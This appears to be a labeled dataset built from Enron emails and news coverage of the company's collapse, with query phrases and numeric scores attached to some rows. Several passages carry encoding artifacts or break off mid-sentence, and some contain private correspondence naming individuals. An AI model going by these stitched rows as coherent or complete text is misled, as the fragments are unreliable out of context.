From a valuation standpoint I assume Case 1 would give us the highest multiple.  The issue is is it doable?  We have achieved $600 million last year.  Also, before we go further with Project Armstrong I would like to get Whalley and Dynegy to agree that if the discussions are successful we would do the deal.

Rod,
Attached are three cases for Project Armstrong.  I know you're out of the office until Wednesday but I thought if you could respond by Blackberry or phone as to which case we should send to TCPL, I would get that to them before the holiday so they could work on it Thursday and Friday.

*	Case 1 is an 8% distribution growth case (starting with the plan and increasing acquisition activity to deliver 8% growth).  To achieve that our total capex for NBP goes up to an average of just over $400 million per year.
*	Case 2 tracks with our budget case and involves about $200 million in capex per year and results in 2 years of 8% growth and then a flat distribution level for the remaining 3 years.
*	Case 3 utilizes the budget case but eliminates all acquisitions (capex is about $30 - $40 million average per year for maintenance and asset development) and assumes NBPL recontracting occurs at 85% of max rates.  The result is distributions increase to $3.30 in 2002 and stay at that level throughout the 5 year period.

Obviously Case 1 is the most aggressive in terms of valuation among the three.  Please let me know if that is ok to send or do you have something else in mind.  Also I could fax hard copies if you would like...

     Enron lawyer Robert Bennett said the report showed a resolve to find the facts and proved that ""the board was not provided a great deal of information that it should have had.''
     Andersen spokesman Patrick Dorton called the report ""self- serving'' in downplaying the board's responsibility. ``The authors, whose independence is already in question, were handpicked by Enron's board,'' Dorton said. ``The authors failed to consult with Andersen in any substantial way.''

'As Little as Possible'

     The report said investigators were told ``by more than one person that the company spent considerable time and effort working to say as little as possible'' in documents about transactions with related parties that proved to be Enron's downfall.
     ""That impulse to avoid public exposure, coupled with the significance of the transactions for Enron's income statements and balance sheets, should have raised red flags for senior management, as well as for Enron's outside auditors and lawyers. Unfortunately, it apparently did not.''
     Lay, a contributor to President George W. Bush, ""bears significant responsibility'' for ""flawed decisions'' in approving some transactions, the report said.
    Enron, once the seventh-largest U.S. corporation, began to unravel in October after it said shareholder equity was reduced by around $1 billion because it used stock to pay off debt of a partnership run by Fastow. The writedown also raised questions about how Enron accounted for debt and losses of similar affiliated partnerships. On Nov. 8, it restated earnings back to 1997, lowering them by $586 million.
     The company filed for bankruptcy Dec. 2 as its stock slid below $1 from more than $80 a year ago and the company was unable to finance its business.

Daren - thank you for the list of the true, remaining ENA sales customers.  I

The sales contract between ENA & Praxair was assigned to HPLC eff/ 10/1/99.  
The only remaining contract between ENA & Praxair is a Master Financial 
Agreement.

Does Praxair really need to remain under ENA or is it okay under HPLC?  If it 
really needs to be under ENA, we will need to un-do the 10/1/99 assignment to 
HPLC or set-up a new contract between ENA & Praxair.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"Over three years starting in 1999, Kenneth L. Lay has reported receiving mo=re than $200 million either from Enron directly or through exercising stock= options. Yet, his lawyer now says, he was forced to borrow millions more f=rom the company last year to meet his obligations.=20The disclosure of Mr. Lay's financial problems, made by Earl Silbert, his p=ersonal lawyer, was aimed at countering the impression that Mr. Lay, Enron'=s chairman and chief executive, might have disposed of Enron stock in late =August because he feared a collapse of the company.Instead, the new information could leave an impression that his personal in=vestments produced very large losses that he was unable to support despite =his large income from Enron.=20Assuming that Mr. Silbert is correct, Mr. Lay joins a short list of chief e=xecutives whose pay in the 1990's was astronomical, and who ended up with s=evere financial problems because they borrowed too heavily against assets w=hose high value proved to be temporary. The others known to have such probl=ems are Bernard J. Ebbers, the chief executive of WorldCom, whose margin lo=ans were guaranteed by the company and whose shares are now worth less than= he owes, and Steven Hilbert, the former chief executive of Conseco, who bo=ught Conseco shares with money borrowed from the company before the stock p=rice collapsed and he was fired.=20Mr. Lay appears to have parlayed his paper gains in Enron to buy other secu=rities that also declined in value. His known investments, which are no dou=bt only a fraction of the actual investments, were concentrated in areas th=at did well when the stock market was soaring and have since suffered. They= include stakes in Compaq Computer, i2 Technologies and NewPower Holdings.==20In fact, Mr. Silbert indicated that Mr. Lay first repaid a company loan wit=h stock last February. Enron was then selling for more than $68 a share, so= it appears that the sale was forced by the declining value of Mr. Lay's ot=her investments.=20Just how much Mr. Lay is now worth is unclear. Nor is it clear how much, if= any, money he still owes, or just what expenditures would have caused him =to go through so much money so quickly. But his stake in Enron, which consi=sts mostly of stock options, is now worthless after the collapse of the com=pany.=20Mr. Lay had a $4 million revolving line of credit from Enron, which Mr. Sil=bert said was raised to $7.5 million at some point in 2001. He said that Mr=. Lay took out money from that loan, and then repaid it, on 15 separate occ=asions from February through October.=20In each case, he repaid it by turning over stock to Enron. He appears to ha=ve obtained some of those shares by exercising options, while in other case=s he returned shares he already owned. Mr. Silbert said Mr. Lay took out th=e loans from the company when he expected that he was likely to face margin= calls from other lenders.=20",0.0,0.0,0.3,0.6

       ""Not only were there corrupt practices,"" Tauzin said. ""Not only was there hiding of the fact that debt was being put off the balance sheets and profits that were reported that didn't exist, but we're finding more than that...what may clearly end up being securities fraud.""
       ""Officers all the way to the board of directors have some responsibility,"" Tauzin said, adding the report even mentioned Ken Lay, the former Enron chairman.
       Houston-based Enron, once the seventh-largest company in America, collapsed in a cloud of debt and questions about its finances and accounting practices. It is under investigation by nine congressional committees, the Justice and Labor departments and the Securities and Exchange Commission.
       ""The tragic consequences of the related-party transactions and accounting errors were the result of many failures at many levels and by many people,"" Enron's internal study says. ""A flawed idea, self-enrichment by employees, inadequately designed controls, poor implementation, inattentive oversight, simple (and not-so-simple) accounting mistakes, and overreaching in a culture that appears to have encouraged pushing the limits.""
       The report's author, Enron Director William Powers, is among those scheduled to testify before Congress in the coming week.
       
ANDERSEN HIRES VOLCKER
       Meanwhile, Andersen, the accounting firm that was Enron's auditor for nine years, challenged the review and called it ""extremely self-serving"" through a spokesman.
       ""The authors of this report, whose independence has already been questioned, were hand-picked by Enron's board,"" said Andersen spokesman Charlie Leonard.
       The accounting firm, under fire for how it handled its oversight of Enron's finances, announced on Sunday it had hired former Federal Reserve Chairman Paul Volcker to help restore its credibility. The firm also said it would no longer offer some consulting services to some clients.
       ""This is not about window-washing or eye-washing,"" Andersen Chief Executive Joseph Berardino told reporters at a news conference. ""This is not where a report comes in a month later that says nothing. This is about getting answers to what the American public needs from an auditing firm.""

  Here is the final wrap on Jeffrey's Suprise Birthday party:

  We are going to meet up at the Willamette Athletic Club in the Cafe between 4:00 - 4:15 pm this Saturday.  Elaine at the front desk knows what we are doing; just tell her that you are there for Jeffrey Oh's thing and she will show you where to go.  Jeff and I will be there at about 4:30.  Jeffrey thinks that we are meeting his brother John and one other friend there to go to Who Song.
  If possible, please park closer to Who Song and Larry's; especially if Jeffrey knows what your car looks like. (don't want him to wonder why all his friends are at the athletic club...)  After the cafe, we will head over to Who Song and Larry's (some time around 5ish for those who can't make it earlier).


  I look forward to seeing you all there!  Thanks for helping me pull this off.
  (If you haven't RSVP'd, please shoot me an email so I have an idea of how many are comming.)

  Thanks again,

  Virginia

""We found a systemic and pervasive attempt by Enron's management to misrepresent the company's financial condition,"" Powers said in his testimony. 
A report on the internal investigation was released over the weekend. Powers outlined the main findings in his prepared testimony, focusing on the firm's use of complex, off-the-books partnerships that enriched key employees, including Chief Financial Officer Andrew Fastow. 
Fastow made ""at least $30 million"" from the partnerships, said Powers. Another Enron employee, Michael Kopper made at least $10 million, and two more made $1 million each, he added. 
Some of the partnerships were improperly structured and didn't follow accounting rules, Powers added. He didn't name the company's outside auditor or attorneys, but said there were ""failures in the performance"" of Enron's outside advisors. 
Rather than hedge Enron's risks, he said the company used the partnerships to avoid recognizing losses on investments. 
""Enron was essentially hedging with itself,"" and deals described as hedging transactions ""weren't real,"" Powers said. In reality, he said only Enron had a real stake in the partnerships and their main assets were Enron's own stock. 
By last March, when the partnerships were unable to make payments, it appeared Enron might have to take a more than $500 million charge to reflect that. Rather than take the hit, Powers said, ""Enron compounded the problem by making even more of its own stock available"" to the partnerships, providing $800 million worth, which resulted in overstating earnings by more than $1 billion. 
""This transaction was apparently hidden from the board and was certainly hidden from the public,"" Powers said. 
As for the partnerships themselves, Powers said ""virtually everyone, from the board of directors on down,"" understood the company was using them to offset investment losses with its own stock. 
""That is not the way it is supposed to work,"" he said. 
Powers faulted the board of directors, saying it ""failed in its duty to provide leadership and oversight.""

Investigators for a special board committee released Saturday a 211-page report that found Enron inflated its profits by nearly $1 billion, while certain high-ranking employees pocketed millions. 
Board members last met Friday at the offices of Weil Gotshal & Manges in New York to review the report, which was eventually distributed to the bankruptcy court, the Securities and Exchange Commission, the Department of Justice, and all 12 of the Congressional Committees investigating Enron. 
Next, the report will be reviewed with Enron's creditors committee and possible courses of action will be discussed, Roberts said. 
Although highly critical of what it sees as questionable practices by management and its auditors, the report doesn't allege criminal activity. The investigation's scope was limited to studying Enron's related-party transactions. 
A person familiar with the board said the directors could request further, follow-up investigations that might address other outstanding issues. 
This person also said it is likely Enron's board will file numerous civil suits against ""third parties"" identified as having contributed to Enron's financial collapse. 
The list could cut across of wide swath of former Enron employees, and may even include outside consultants such as Enron's auditor, Arthur Andersen LLP. 
In response to the results of the internal probe, Andersen issued a written response Saturday that called the investigation ""an attempt to insulate (Enron's) leadership and the board of directors from criticism by shifting blame to others."" 
Enron's longtime legal advisers, Vinson & Elkins, also were criticized by the report for not providing a ""more objective and critical voice."" 
Officials from the Washington, D.C., law firm have not returned repeated phone calls requesting a comment.

Gonzalez, of the Bankruptcy Court of New York, could employ in a case that includes ""fraud, dishonesty, incompetence or gross mismanagement,"" as specified by the bankruptcy code. 
But the more likely, and less disruptive, choice is for the judge to name an examiner to investigate certain aspects of Enron's business in order to determine whether misdeeds occurred. 
If this happens, more information could come out about the partnerships as well as about allegations of insider trading and mishandling of employees' pension funds by Enron executives - aspects that weren't covered by the internal investigation. 
""There's a large amount of concern that it's business as usual at Enron,"" said John Nabors, who represents Exco Resources Inc. (EXCO), an Enron creditor. ""(Enron) seems to have a corporate culture that all the rules don't apply."" 
In the next few weeks, Exco also plans to ask the bankruptcy court to name a trustee or examiner in Enron's case - joining a half-dozen energy concerns that have already filed similar requests.

WASHINGTON, Feb 4 (Reuters) - The AFL-CIO called on U.S. regulators on Monday to bar directors of Enron Corp. from serving on other companies' boards, arguing the directors were ""substantially unfit"" for such duties. 
Focusing on corporate governance issues dear to unions, the U.S. labor federation released a letter it wrote to Securities and Exchange Commission Chairman Harvey Pitt citing ""imminent danger to workers' retirement savings.""
""The SEC must now investigate the role of each individual Enron director in the company's collapse and move to bar those responsible from other boards,"" AFL-CIO Secretary Treasurer Richard Trumka said in a statement. 
The 66-union federation called for bans on all directors of Houston-based Enron except recently appointed William Powers and Raymond Troubh. Powers and Troubh were two of the co-authors of an internal inquiry report released on Saturday that examined the collapse of the former energy trading giant. 
The third co-author, Herbert Winokur, was among 10 Enron directors who should be barred from boards on which they serve, including Owens Corning , Comdisco In",0.0,0.5,0.7,0.2

To Mr. Ken Lay,

I'm writing to urge you to donate the millions of dollars you made from selling Enron stock before the company declared bankruptcy to funds, such as Enron Employee Transition Fund and REACH, that benefit the company's employees, who lost their retirement savings, and provide relief to low-income consumers in California, who can't afford to pay their energy bills.  Enron and you made millions out of the pocketbooks of California consumers and from the efforts of your employees.

Indeed, while you netted well over a $100 million, many of Enron's employees were financially devastated when the company declared bankruptcy and their retirement plans were wiped out.  And Enron made an astronomical profit during the California energy crisis last year.  As a result, there are thousands of consumers who are unable to pay their basic energy bills and the largest utility in the state is bankrupt.

The New York Times reported that you sold $101 million worth of Enron stock while aggressively urging the company's employees to keep buying it.  Please donate this money to the funds set up to help repair the lives of those Americans hurt by Enron's underhanded dealings.

While most of what we do iscontained within Enron's electronic systems, there still are times when hardcopies are made or needed for running our business. Here is how you musthandle those hard copy documents:1. The basic rule is that if you have hard copies of documents that areused in EPMI's business of selling energy in the WSCC, you must keep thosedocuments until further notice. If space becomes a problem, please contactDebra Davidson who can arrange for storage.2. What constitutes a document? In some instances you will have onecopy of a document that has your handwritten notes on it, and another copythat may be clean. For these purposes both are considered documents andboth must be saved. Similarly, if several people have copies of the samedocument, each separate copy is considered a separate document. On theother hand, if you made 10 copies for a meeting and there were 4 left overthat were never handed out or were not used, those may be recycled so longas you keep the ones that were used. If you keep handwritten notes foryour work, those would be considered documents as well. Telephone notes,charts, printouts of data, spreadsheets etc. all constitute documents. Ifyou have a question about what constitutes a document and whether it shouldbe saved, please ask Christian Yoder and Steve Hall.3. The goal and purpose of this policy is to make sure that no hardcopies of documents are discarded that are relevant to the wholesaleelectricity market litigation. If hard copy documents are discarded, at alater point in time EPMI and/or its employees will be criticized for failingto preserve documents relevant to the wholesale electricity litigation.4.

He would like to have a phone call with Enron's attorneys and credit people to figure out how to manage our credit issues going forward.  The reason there was no action last week was because NEPOOL hoped that they could work something out.  I do not know what the bills are for EES/EEMC/EPMI?

Subject: ENA Sales on HPL

I am working on a project for Brenda Herod & was wondering if one of you 
could tell me if I'm on the right track & if this will get everything for 
which she is looking.

She is trying to draft a long-term transport/storage agreement between ENA & 
HPLC which will allow ENA to move the gas to their markets.  In order to 
accomplish this, she needs to know all of the Sales to customers that ENA is 
doing off of HPL's pipe.

I had Scott Mills run a report from Sitara showing all ENA Buy/Sell Activity 
on HPL since 7/99.  If I eliminate the Buys & the desk-to-desk deals, will 
this give me everything that I need?

Are there buy/sell deals done with ENA on HPL's pipe that wouldn't show up in 
Sitara?  Someone mentioned something about deals where HPL transports the gas 
on it's own behalf then ENA sells it to a customer at that same spot  --  
?????  Do deals like that happen? Would they show up in Sitara?

Is there anything else that I'm missing?  I'm not real familiar with how some 
of these deals happen nowadays so am very receptive to any 
ideas/suggestions/help that you can offer !!!

Thanks in advance.

BLAMING EACH OTHER, EL PASO SHIPPERS CALL FOR ALLOCATION OVERHAUL
Contract demand shippers last week argued anew that insufficient physical capacity exists on the El
Paso Natural Gas Co. system and that full-requirement shippers often are to blame for system disruptions
on peak days. In comments, various El Paso shippers called on FERC to address their concerns and many
suggested that the commission should pull together separate but related El Paso proceedings.

For its part, El Paso rebutted a July 17 complaint (RP01-486) by a group of mostly full-requirements
shippers located east of California. The EOC shippers alleged that El Paso was neglecting its responsibili-ties
to existing shippers while concentrating on drumming up new business without needed system
upgrades or expansions. The shipper group claimed that a 10-year rate freeze running through 2005 gives
El Paso no incentive to improve its system to maintain service quality (IF, 23 July, 3).

The complaint ""is without foundation in fact, law or policy,"" El Paso insisted in an Aug. 6 answer. The
pipeline ""has consistently maintained"" facilities or built new capacity ""whenever it has been economically
justifiable"" under the 1995 settlement. In the meantime, a large and unexpected increase in full-require-ments
load has triggered use of a capacity-allocation scheme, which also was agreed to by parties in the
settlement, El Paso told FERC.

Frustration with the capacity-allocation methodology was expressed by CD shippers in response to the
complaint. In representative comments, the Indicated Shippers agreed with the EOC shippers that a
""chronic"" shortage of capacity exists on El Paso but did not accept the EOC group's version of events that
led to the problem or its proposed solution. The EOC group asked FERC to direct El Paso to add facilities
and dedicate all of the 230,000 Mcf/day of capacity from an ongoing conversion project to existing firm
contractual obligations.

The Indicated Shippers derided the term ""existing firm obligations"" as vague enough to cover
new power plants and referred to the controversy surrounding El Paso's Redhawk project, which FERC
recently agreed can be built under automatic blanket authorization to serve two power plants in
Maricopa County, Ariz. To bring certainty to the El Paso system, all shipper",0.0,0.0,0.7,0.2

Wheeler said thatcompanies do not want this increased volatility to apply to theirdeterminations of income for tax purposes.Price said the accounting profession adopted new standards for derivativesbecause of numerous problems, including:* incomplete reporting, in that some companies reported no informationor reported information only in a footnote;* inconsistent reporting, in that companies used different rules fordetermining cost and value;* difficulty in applying the accounting rules; and* lack of transparency, in that companies took different approaches intheir treatment of derivatives,meaning income was not determined under the same rules andinformation on financial statements could not be compared with reliability.Issues for Congress to StudyBuckley said the mark-to-market approach is slowly beingadopted in the tax system. He said it was not something he favored acrossthe board but in his view it made sense for the tax system to apply themark-to-market approach to derivatives. He said the problems identified byPrice in accounting for derivatives also applied to the tax system--there isuncertainty and inconsistency.Buckley also said it would simplify recordkeeping to conformthe tax system to the accounting approach, and he favored Congress lookingat this question. He said that Congress's adoption of the mark-to-marketapproach for securities in the early 1990s was the right approach, and hethought that the Financial Accounting Standards Board had taken an""interesting and important step"" in adopting FAS 133.Buckley said he sees the problem of defining a derivative asa major issue for the tax law, and questioned whether the accountingdefinition was ""workable."" Other panelists said it is, but Price noted thatthe definition is very fact-specific, and Wheeler said the rules are so newit is too early to tell whether companies will attempt to structuretransactions to use the accounting definition.",0.0,0.0,0.7,0.2

Janette,

I did leave you a voice message.  The Commodity price right now is $2.55 with a $.03 premium to schedule out of the basin and a $.05 premium to schedule the delivered volumes at the delivery point.  Also, in order to be allowed to schedule for you, we will have to get an agency agreement in place with El Paso, which could take some time.  In the case we don't get it in place to schedule for you Aug 1st, you could request El Paso to put your nom in daily until we get the agreement executed and in place.

Let me know if you have any questions.

Janette,

Attached is the Parent Guaranty form that we need to get executed in
order to do business.  Enron's credit department is asking for the
guaranty to be for $10 million.  Let me know if you guys are agreeable
to this.  Also, I need to know if the name of the guarantor is BHP
BILLITON LTD.  We couldn't tell from the web site if this was correct.

Let me know if you need updated pricing.  Prices were down on the day
but have moved back up.

Thanks,

But investors counting on these gains could be in for a jolt down the road. Shares of these companies have been on a tear lately. And some of the biggest players are in Houston, the center of the energy-trading industry. Dynegy Inc.'s stock is up more than fourfold so far this year at $53.438, and now trades for 41 times what analysts project the company's 2000 earnings will be, according to First Call/Thomson Financial. Shares of Enron Corp., the largest trader of gas and electricity in North America, have nearly doubled this year to $84.875, or 60 times earnings. Meanwhile, El Paso Energy Corp.'s stock has jumped 61% this year to $62.375, or 24 times earnings.Traders at these and other companies are capitalizing on the wild price swings and supply fluctuations that have accompanied deregulation in some regional markets. Natural-gas prices have more than doubled in the past year, while supplies have tightened. And the rapid price fluctuations for electricity have prompted many large businesses to seek price protection through hedging or fixed-price contracts, generating large premiums for traders. But what many investors may not realize is that much of these companies' recent profits constitute unrealized, noncash gains. Frequently, these profits depend on assumptions and estimates about future market factors, the details of which the companies do not provide, and which time may prove wrong. And because of minimal disclosure standards in these kinds of cases, it's difficult for investors to assess whose assumptions might be too aggressive, or what market changes might invalidate the assumptions -- and force earnings revisions.",0.3,0.3,0.8,0.0

Bill, attached is a list of bonds that our broker (John L. Wortham, LLP) received a notice of cancellation on from  Fireman's Fund and Safeco.   Please determine which obligations will be required in the future.  However our broker has offered assistance in establishing a replacement surety, but you may also want to investigate alternative form of acceptable security.

We have continued to emphasize the importance of not changing these deals after they are completed, but despite this, it is still happening. I am going to try and track down Jeff Shankman this afternoon to discuss.We are also seeing more and more customers trading under the wrong entities...for example, Aquila Risk Mgmt is executing physical deals, when they should be only executing financial deals. From my understanding, we have ""left the door open"" for them to trade either way and are relying on them to trade under the correct counterparty. This is causing several problems downstream..for instance, customers are wanting ENA to send modified invoices with the name of the correct counterparty (despite the fact that they were the ones transacting under the wrong entity).

likely interfere with several Assembly fundraising events this evening.

Revenue and Taxation Committee at 1:30 p.m. in room 126.

SB 532 (Sher), renewable portfolio standard, will be heard by the Assembly

Applewhite Still Doubtful; Simms Looks Like Sure Starter

Coach Mack Brown said Monday QB Major Applewhite's knee sprain is still
being
evaluated and he said Chris Simms would be the starting QB if the Horns had
a
game right now.
Texas doesn't have a game right now, but look for Simms to start Friday
afternoon against Texas A&M and look for him to get all the action unless
he
falters. If he falters, the coaches might try Applewhite, but he has never
been very mobile and he is even less mobile now.
If Applewhite is pressed into action, he probably will work almost
exclusively out of the shotgun because he can't backpedal very well.
Brown said he will have a better idea Tuesday about Applewhite's chances of

playing. He said the doctors were putting Applewhite through a lot of tests

Monday and he said he would have the results Tuesday.
Brown said he thinks Simms, who has had four passes picked off and returned

for touchdowns, has a better understanding of the UT offense now.
""I think he understands now hard hard it is to play quarterback at this
level,"" Brown said. ""After the Kansas game, he said he knew he couldn't
complete every pass and he knew now you have to throw some balls away.""
He said that is the key to playing quarterback.
Safety Lee Jackson and TE Brock Edwards, both battling leg injuries, remain

questionable for the Texas A&M game. I goofed in my fax last week when I
said
Greg Brown was hurt. I got my safeties mixed up.

Offensive coordinator  Greg Davis  said the Longhorns need to be have a
balanced offense Friday. He said a good running game makes it harder for a
defense to handle a passing attack, and he said a good passing attack opens

up more running opportunities.
He said the Longhorns have won every game in which they have rushed for 200

or more yards at Texas.

they would like to hold a May 25 Committee mark up of S. 1886 
(Smith-Inhofe-Feinstein bill), which they consider the ""primary"" vehicle for 
considering RFG and MTBE issues.   Chairman Smith will not likely endorse the 
Daschle/Lugar bill, but will open the door for dialogue ""with the ethanol 
interests.""    One of the primary issues that Committee staff have not been 
able to resolve is how to get ethanol support for oxygenate waiver 
legislation.   Lugar and Daschle will likely have a great deal of impact on 
how much of their bill is considered along with S. 1886 at the May 25 markup.

Pro-ethanol provisions may not see much support at the Senate Environment 
Committee level, but if the legislation moves to the Senate floor, there 
could be much more support for some of Lugar's/Daschle's proposals.

I will keep you posted as the legislation develops and as our efforts to find 
support for MTBE producer ""incentives"" continues.

''Shocking.''=20With those words, securities law experts around the country condemned the w=ay Enron had structured and sold a partnership called LJM2, which offered i=nvestors a chance to profit from confidential information about Enron's inv=estment plans -- and gave the partnership investors more information about =the company's finances than Enron's shareholders received.''This is potentially the most serious revelation about Enron to date,'' sa=id Joel Seligman, a securities law historian and dean of the Washington Uni=versity Law School. ''You can't overstate how shocking it is.''=20But did the arrangement, however unfair it seems to stockholders, actually =violate the nation's securities laws and regulations? That is far more diff=icult to answer, legal scholars say -- and far more important. For them, th=e fundamental question about the sprawling Enron scandal is whether it is a= case of strong laws being violated by bad people, or of weak laws renderin=g such violations unnecessary.=20''If a company of this size, advised by top-tier accountants and law firms,= could conclude that our laws permit some of what happened here, then our l=aws are inadequate,'' said Richard C. Breeden, a former chairman of the Sec=urities and Exchange Commission. ''Clearly it violates the spirit and inten=t of securities laws and the whole concept of full and fair disclosure.''==20The quandary is particularly acute in the case of this partnership, because= it seemed to thrive on arrangements -- procedural barriers known as ''Chin=ese walls'' -- that were actually intended to protect investors. These lega=l barriers prevented investment bankers who were privy to information about= the partnership from legally sharing that information with shareholders. I=nstead, investors remained in the dark about Enron's actual financial condi=tion.=20But the partnership, lawyers and finance experts say, raises novel question=s about the effectiveness of other parts of the securities laws, as well. T=hese include prohibitions against trading on inside information; rules agai=nst selectively disclosing information to some shareholders and not others;= efforts to police corporate conflicts of interest and the wisdom of removi=ng restrictions on the roles that investment banks can play.=20''No matter how good you make the laws, there will always be a small group =of people who will push them,'' said John Pound, a former finance professor= at Harvard and the president of Integrity Partners, an investment manageme=nt firm in Boston.

All Rights ReservedEnron, the US energy trader which is under intense scrutiny by analysts who have demanded the company release more detailed financial information, on Wednesday gave details of a $1.2bn charge against equity it skipped over in its third quarter results briefing on Tuesday. On Wednesday, Enron outlined details of a $1.01bn charge against earnings in its result, due to failed investments in its telecommunications, retail energy sales and water businesses.Ken Lay, chairman, fleetingly mentioned a separate $1.2bn charge against equity, or a dilution of equity on the company's balance sheet, in a conference call with analysts and the media, and said it would not affect the company's credit rating. Many analysts apparently thought this was the $1.01bn charge Mr Lay was willing to break down and to answer questions about. Mr Lay met analysts on Wednesday in New York, but there was again no mention of the $1.2bn charge. Mr Lay apparently initially refused to answer questions from frustrated analysts. In August, after the departure of Enron's chief financial officer, Jeff Skilling, Mr Lay promised to provide more earnings transparency. ""It was unbelievable. Questions were asked and he moved around it and then finally he [Mr Lay] gave a roundabout answer. The [$1.2bn] charge was all related to the writing down of the se failed investments,"" one analyst said. ""They were trying to sneak it by. They already have a credibility problem and this did not help it,"" he said, adding that Enron never disclosed the charge's net effect and Moody's Inv estor's Services, the credit rating agency, placed Enron's $13bn of debt on hold minutes later. ""We told them we felt they should have been more honest in the presentation [yesterday]."" Enron rejected criticism of the failure to fully report and explain the $1.2bn charge.

The angered lawmakers said they wanted to learn just how much Lay knew about the way Enron was running its business. 
""Mr. Lay may contend, and I would stipulate it's theoretically possible, that Mr. Lay as CEO did not know what was going on beneath him,"" said Sen. Peter Fitzgerald, R-Ill. But to believe that, Fitzgerald said, ""you would have to conclude that Mr. Lay was the most out to lunch CEO of any corporation in America.""
The House Financial Services Committee also plans to subpoena Lay.
""Mr. Lay's last-minute declaration not to appear at tomorrow's hearing is a most serious matter,"" a representative for House Financial Services Chairman Michael Oxley, R-Ohio, told Lay's attorney Earl Silbert in a letter on Monday.
While the Senate hearing was cancelled, a hearing by the House Financial Services Committee is underway, with testimony coming from Harvey Pitt, chairman of the Securities and Exchange Commission, and Enron director William Powers.
Powers, who oversaw an internal report on Enron's collapse that was released Saturday, told lawmakers in prepared testimony: ""What we found was appalling."" 
According to Powers, Enron didn't follow accounting rules and its management routinely distorted its financial condition. 
Meantime, at the hearing, Pitt told the House panel the agency is planning a full-scale review of corporate disclosure laws to avoid another Enron-like tragedy. 
""There are fundamental longstanding flaws in our system -- and now they are on the table,"" Pitt said. 
The SEC chairman also urged the Financial Standards Accounting Board to set new audit standards on limited partnerships.
The internal report
Lay's refusal to appear on Capitol Hill came one day after an internal Enron report claimed executives at the company inflated profits and disguised the company's poor financial health. The investigative report said that said senior Enron executives hid more than $1 billion in losses by creating outside partnerships that made some of them millions of dollars while disguising the company's poor financial health.
The report from a special committee of Enron's board of directors headed by Powers, dean of the law school at the University of Texas, blasts Lay and former chief executive Jeff Skilling for the way the partnerships were structured and for lack of oversight over them. The company owned a 97 percent stake in those partnerships.

mark to market losses,0,"Oct. 16, 2001, 11:32PMEnron posts loss after write-downs Core businesses considered solid Houston ChronicleBy LAURA GOLDBERG Copyright 2001 Houston Chronicle Enron Corp. posted a third-quarter loss after taking $1.01 billion in charges aimed at dealing with problems it said distracted investors from focusing on the company's core energy businesses. With write-offs in its water and broadband businesses and on a retail electricity investment, the energy trader Tuesday reported a loss of $618 million or 84 cents a diluted share. That compares with net income of $292 million, or 34 cents a diluted share, a year ago. ""The underlying earnings from what Enron does well, which in my view is wholesale and retail energy, were solid,"" said Andre Meade, an analyst with Commerzbank Securities in New York. ""The big news item is the significant write-down."" The charges include: ? $287 million to reflect losses on assets to be sold by troubled water and wastewater services unit Azurix. ? $180 million related to downsizing in Enron's broadbroad operations including severance cost and losses on both inventory sales and customer contracts. ? $544 million for investment losses and dismantling a financial vehicle used by Enron for investment projects that was disliked by some on Wall Street. About half the amount is related to New Power Co., a retail electricity and natural gas provider that is 45 percent owned by Enron. Enron created New Power and then spun it off. In last year's initial public offering, New Power shares debuted at $21. Tuesday, they closed at $1.90. Enron also has its own retail energy business that follows a different model. Other portions of the charge cover losses on investments in broadband and technology ventures. Meade said the charges call into the question some of the directions Enron has moved in outside of its core energy business. He added: ""It certainly confirmed a lot of the businesses that they went into and were highly touted have destroyed value. That's not good for a company like Enron, which is very innovative."" Excluding the charges, Enron's third-quarter net income increased 35 percent year-over-year to $393 million, or 43 cents a diluted share. Analysts surveyed by Thomson Financial/First Call expected, on average, Enron to report a profit, before one-time charges, of 43 cents a diluted share. Ken Lay, Enron's chairman and chief executive, said Enron turned out strong results in its core wholesale and retail energy businesses, as well as its natural gas pipelines. ""As these numbers show, Enron's core energy business fundamentals are excellent,"" Lay said on a conference call. Income for its wholesale services division, before interest and taxes, rose 28 percent year-over-year.

record keeping accounting practices,1,"Subject: Re: Quarterly Noteholder ReportsThanks for your comments below. We consulted our AA folks in drafting the disclosures. It wasn't a big deal for Enron's 10Q because the positions between NNG and TW are eliminated in the consolidated statements. As for the Form 2 and the Brown Covers, there are specific GAAP disclosure requirements that we have to include on a stand-alone basis. Since most of these positions will be gone by year end, it won't look nearly as massive as it was at the end of the third quarter. In fact, if Roger Willard had given us his final word about the transactions in time, we would have booked the ultimate net transactions in September and we wouldn't have had all these gross positions. I don't feel quite as bad about not getting it right in the unaudited third quarter financials as I otherwise would, since we did review the transactions and the noteholders disclosures with AA before the 3rd quarter was released and before the noteholders reports were distributed. As always, Legal and Regulatory will have ample opportunity to comment on Brown Cover and Form 2 disclosures before they are finalized.  Harris/ET&S/Enron@Enron, Mary Kay Miller/ET&S/Enron@ENRON Subject: Quarterly Noteholder ReportsI've reviewed the draft NN and TW quarterly reports to noteholders. I haven't had a chance to compare these to prior quarterly filings, but I have three questions/concerns. First, the discussions of ""Price Risk Management Activities"" seem overly detailed and cumbersome given the true commercial impact of the deals involved. For example, we disclose the total notional amount of gas involved in the Transcanada deal, the ""fair value"" of the trades, and a variety of other details, even the total economic impact of the deal to us is pretty small (about a million dollars if I remember right). The base gas deal, by comparison, was discussed in one sentence. Can we avoid making the thing look bigger than it really is by disclosing something more meaningful like VAR (which I assume would be a much smaller number)? Second, disclosing TW and NN trading activity separately makes the Transcanada deal look like a bigger thing than it really was, since the TW and NN portions offset one another. I know we need to disclose deals separately for each operating company, but is there a way things like notional value and ""fair value"" (or VAR) can be aggregated to more accurately reflect the total impact of the deal--currently it looks like both TW and NN were out doing huge commodity deals. Third, I have never been that concerned about overly broad disclosures in the noteholder reports because of the limited distribution. However, if these disclosures will be Arthur Anderson's template for the Enron Corp. 10Q or the FERC Form 2s, I have a real problem. Please let me know if I can be of help in talking through these issues. DF",0.3,0.3,0.7,0.2

